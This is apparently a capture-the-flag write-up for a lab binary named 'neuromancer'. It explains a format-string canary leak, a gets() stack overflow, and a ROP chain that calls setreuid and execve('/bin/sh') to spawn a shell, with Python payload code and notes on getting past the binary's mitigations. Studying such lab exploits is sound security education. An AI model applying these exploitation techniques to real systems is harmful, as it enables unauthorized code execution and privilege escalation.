# neuromancer — exploit writeup

## Reading the disassembly as pseudo-C

`main` → `init_nodes()` (seeds a 12-entry `nodes[]` table, each entry
getting a `default_handler` function pointer — not used by the
exploit) → `print_banner()` → `handle_command()`, which runs three
functions in sequence:

```c
void handle_command(void) {
    info_leak();
    console_handshake();
    process_input();
}
```

### `info_leak` — a free, unsolicited libc leak

```c
void info_leak(void) {
    void *puts_addr = GOT_puts;         // already resolved by this point
    printf("<debug text> %p\n", puts_addr);
}
```

Before any user input is even read, the program prints the resolved
runtime address of `puts()` from its own GOT entry. This is a
ready-made libc base leak (`puts_addr - libc_puts_offset = libc
base`) — effectively a backdoor around ASLR. This particular exploit
doesn't bother parsing it, because the target environment's libc base
is already fixed/known, so every address below is simply hardcoded.
Against an ASLR'd target, this line is all you'd need to compute the
real base at runtime instead of hardcoding one.

### `console_handshake` — format-string leak

```c
void console_handshake(void) {
    char buf[80];                      // -0x50(%rbp)

    printf("Console handle: ");
    fflush(stdout);

    if (fgets(buf, 0x40, stdin) != NULL) {
        printf("Trace echo: ");
        printf(buf);                   // <-- user input as the format string
    }
}
```

Same recurring bug as every prior level: `printf(buf)` instead of
`printf("%s", buf)`. `fgets` itself is bounded (64 into an 80-byte
buffer, no overflow here), but the format string lets the exploit
dump an arbitrary stack slot. It sends `%15$p` and reads the value
straight back off the `"Trace echo: "` line:

```python
p.sendline(b'%15$p')
p.recvuntil(b'Trace echo: ')
canary = int(p.recvline().strip(), 16)
```

At this stack depth, that slot holds the saved canary for
`process_input`'s frame.

### `process_input` — the overflow

```c
void process_input(void) {
    char buf[136];                     // -0x90(%rbp), 136 bytes before canary
    unsigned long n;

    printf("...");
    fflush(stdout);
    gets(buf);                         // unbounded read — the overflow

    if (strncmp(buf, "SHOW:", 5) == 0) {
        n = strtoul(buf + 5, NULL, 10);
        show_node(n);
    } else if (strncmp(buf, "ALL", 4) == 0) {
        for (unsigned i = 0; i < node_count; i++)
            show_node(i);
    } else {
        puts("unknown command");
    }
}
```

`gets()` is unbounded, as usual — the command parsing afterwards
(`SHOW:`/`ALL`) is irrelevant to the exploit, since the overflow
already happens during the `gets()` call itself, before any of that
logic runs.

## Mitigations and how each is handled

| Mitigation | Status | How the exploit deals with it |
|---|---|---|
| Stack canary | **Found** | Leaked in `console_handshake` via `%15$p`, then written back unchanged at its exact offset in `process_input`'s overflow. |
| NX | Enabled | Payload is a ROP chain of libc calls, no shellcode on the stack. |
| PIE | Disabled | Addresses are hardcoded libc offsets from a known/fixed base (the free `info_leak()` output isn't even needed here). |
| SHSTK / IBT (CET) | Enabled | Only `pop reg; ret` gadgets and direct libc function calls are used — no indirect branches. |
| Partial RELRO | — | Not targeted; GOT is read (by `info_leak`, benignly) but not overwritten. |

## Payload layout

```
offset 0   : 136 bytes padding   -> fills buf[136] up to the canary slot
offset 136 : leaked canary (8B)  -> keeps __stack_chk_fail from firing
offset 144 : 8 bytes filler      -> saved rbp
offset 152 : ROP chain starts here, overwriting the saved return address
```

`136` is exactly the distance from the start of `process_input`'s
local buffer to the canary slot (`0x90 - 0x8`).

### The ROP chain

```python
exploit  = p64(ret)                              # stack alignment
exploit += p64(pop_rdi) + p64(1026)
exploit += p64(pop_rsi) + p64(1026) + p64(0)
exploit += p64(addr_setreuid)
exploit += p64(pop_rdi) + p64(addr_shell)
exploit += p64(pop_rsi) + p64(0) + p64(0)
exploit += p64(pop_rdx) + p64(0) * 5
exploit += p64(addr_execve)
```

Same construction as the previous levels:

1. **`ret` (stack alignment)** — one bare `ret` gadget first, so the
   stack is 16-byte aligned before calling into libc functions that
   rely on SSE instructions internally.
2. **`setreuid(1026, 1026)`** — `pop_rdi`/`pop_rsi` load matching
   real/effective uid and gid, then `setreuid`'s libc address is
   called directly, so the shell inherits the right privilege level.
3. **`execve("/bin/sh", NULL, NULL)`** — `rdi` points at the
   `"/bin/sh"` string already present inside libc (`addr_shell`),
   `rsi`/`rdx` are zeroed via `pop_rsi`/`pop_rdx`, then `execve`'s
   libc address is called directly. (No `exit()` fallback this time —
   if `execve` succeeds, which it does, control never returns.)

All addresses (`execve`, `setreuid`, `/bin/sh`, the gadgets) are
hardcoded as fixed offsets from a known libc base
(`0x7ffff7c00000`), which only works because the environment isn't
defeating the exploit with ASLR. As noted above, `info_leak()` means
this level doesn't even strictly need that assumption — a real attack
could parse its automatic `%p` output to compute the true libc base
at runtime instead.

## Running it

```sh
python3 exploit.py
```

The script connects to `./neuromancer`, leaks the canary through
`console_handshake`'s format-string bug, builds the padding + canary
+ ROP payload, sends it to `process_input`'s `gets()`, and drops into
an interactive shell once `execve` hands off control.

## Summary

| Stage | Technique |
|---|---|
| Bonus leak | `info_leak()` unconditionally prints a resolved libc (`puts`) address — unused here, but a ready-made ASLR bypass |
| Vulnerability 1 | Format-string bug in `console_handshake` (`printf(buf)` instead of `printf("%s", buf)`) |
| Vulnerability 2 | Stack buffer overflow via unbounded `gets()` in `process_input` |
| Canary bypass | Leak canary with `%15$p`, reinsert it unchanged in the overflow payload |
| NX bypass | ROP chain instead of shellcode |
| Privilege handling | `setreuid()` call before spawning shell |
| Shell spawn | `execve("/bin/sh", NULL, NULL)` using libc's own string |
| Address source | Hardcoded libc base (no ASLR / fixed env) |
